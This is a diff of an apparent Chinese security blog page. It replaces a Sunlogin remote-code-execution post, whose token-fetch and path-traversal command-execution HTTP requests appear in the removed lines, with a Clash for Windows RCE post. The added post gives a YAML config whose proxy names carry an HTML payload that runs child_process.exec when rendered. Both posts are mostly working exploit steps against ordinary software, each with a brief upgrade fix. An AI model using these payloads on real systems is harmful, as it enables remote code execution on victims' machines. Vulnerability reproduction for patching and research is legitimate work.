@@ -3,7 +3,7 @@
         <head>
         <meta name="viewport" content="width=device-width,minimum-scale=1,maximum-scale=1,initial-scale=1,user-scalable=no" />
         <meta charset="utf-8">
-        <title>sunlogin RCE | 老白</title>
+        <title>clash RCE | 老白</title>
         <link rel="stylesheet" href="https://V-alkoinen.github.io/styles/main.css">
         <link rel="stylesheet" href="https://at.alicdn.com/t/font_1306644_jwtuc2zzbrd.css">
         <link href="https://cdn.bootcss.com/animate.css/3.7.2/animate.min.css" rel="stylesheet">
@@ -49,46 +49,51 @@
                 <div class="mdui-row">
                         <div class="mdui-col-md-8 mdui-col-offset-md-2 ">
                                 <article class="mdui-p-a-2 post animated fadeIn" style="animation-delay: 0.8s;animation-duration: 2s">
-                                    <div class="post-title  mdui-m-b-1">sunlogin RCE</div>
-                                    <div class="mdui-typo-body-2 mdui-m-b-2" datetime="2022-02-16 19:41:52">2022-02-16 / 1 min read</div>
-                                    <div class="mdui-m-b-2 mdui-typo post-neirong"><h1 id="影响范围">影响范围</h1>
-<p> 11.1.1.x<br>
- 10.3.0.27372<br>
- 11.0.0.33162</p>
+                                    <div class="post-title  mdui-m-b-1">clash RCE</div>
+                                    <div class="mdui-typo-body-2 mdui-m-b-2" datetime="2022-02-26 18:55:58">2022-02-26 / 1 min read</div>
+                                    <div class="mdui-m-b-2 mdui-typo post-neirong"><h1 id="clash">CLASH</h1>
+<p>  A Windows/macOS/Linux GUI based on Clash and Electron.</p>
+<h1 id="rce">RCE</h1>
+<p>  <a href="https://github.com/Fndroid/clash_for_windows_pkg/issues/2710">参考链接</a></p>
 <h1 id="漏洞复现">漏洞复现</h1>
-<p> 查看向日葵开放端口：</p>
-<pre><code>tasklist | findstr Sunlogin
-#查找PID
+<pre><code>port: 7890
+socks-port: 7891
+allow-lan: true
+mode: Rule
+log-level: info
+external-controller: :9090
+proxies:
+  - name: a&lt;img/src=&quot;1&quot;/onerror=eval(`require(&quot;child_process&quot;).exec(&quot;calc.exe&quot;);`);&gt;
+    type: socks5
+    server: 127.0.0.1
+    port: &quot;17938&quot;
+    skip-cert-verify: true
+  - name: abc
+    type: socks5
+    server: 127.0.0.1
+    port: &quot;8088&quot;
+    skip-cert-verify: true
 
-netstat -ano | findstr &lt;pid&gt;
-#查找端口
+proxy-groups:
+  -
+    name: &lt;img/src=&quot;1&quot;/onerror=eval(`require(&quot;child_process&quot;).exec(&quot;calc.exe&quot;);`);&gt;
+    type: select
+    proxies:
+    - a&lt;img/src=&quot;1&quot;/onerror=eval(`require(&quot;child_process&quot;).exec(&quot;calc.exe&quot;);`);&gt;
 </code></pre>
-<p><img src="https://V-alkoinen.github.io/post-images/1645157954635.png" alt="" loading="lazy"><br>
-<img src="https://V-alkoinen.github.io/post-images/1645157959994.png" alt="" loading="lazy"><br>
- 获取token</p>
-<pre><code>GET /cgi-bin/rpc?action=verify-haras HTTP/1.1
-Host: &lt;ip&gt;:&lt;port&gt;
-</code></pre>
-<p><img src="https://V-alkoinen.github.io/post-images/1645157986350.png" alt="" loading="lazy"><br>
- 执行命令</p>
-<pre><code>GET /Check?cmd=ping%2e%2e%2f%2e%2e%2fWindows/system32/WindowsPowerShell/v1%2e0/powershell.exe+ipconfig HTTP/1.1
-Host: &lt;ip&gt;:&lt;port&gt;
-Cookie: CID=&lt;token&gt;
-</code></pre>
-<p><img src="https://V-alkoinen.github.io/post-images/1645158015142.png" alt="" loading="lazy"><br>
- 也可以使用github上的exp<br>
-<img src="https://V-alkoinen.github.io/post-images/1645158303650.png" alt="" loading="lazy"></p>
-<h1 id="漏洞修复">漏洞修复</h1>
-<p> 更新向日葵至最新版</p>
+<p><img src="https://V-alkoinen.github.io/post-images/1646132381999.png" alt="" loading="lazy"><br>
+<img src="https://V-alkoinen.github.io/post-images/1646132387621.png" alt="" loading="lazy"></p>
+<h1 id="解决方案">解决方案</h1>
+<p>  升级至 <code>v 0.19.10</code></p>
 </div>
                                     <div class="mdui-divider mdui-m-b-2"></div>
                                     <div class="mdui-row-xs-2 post-fenye">
                                        
-                                        <div class="mdui-col"> <div class="mdui-text-left"><a href="https://V-alkoinen.github.io/post/clash-rce/">clash RCE</a></div></div>
+                                        <div class="mdui-col"> <div class="mdui-text-left"><a href="https://V-alkoinen.github.io/post/vulnstack-2/">vulnstack 2</a></div></div>
                                         
 
                                         
-                                        <div class="mdui-col"><div class="mdui-text-right "><a href="https://V-alkoinen.github.io/post/ding-ding-rce/">DingDing-RCE</a></div> </div>
+                                        <div class="mdui-col"><div class="mdui-text-right "><a href="https://V-alkoinen.github.io/post/sunlogin-rce/">sunlogin RCE</a></div> </div>
                                        
                                       </div>
                                    
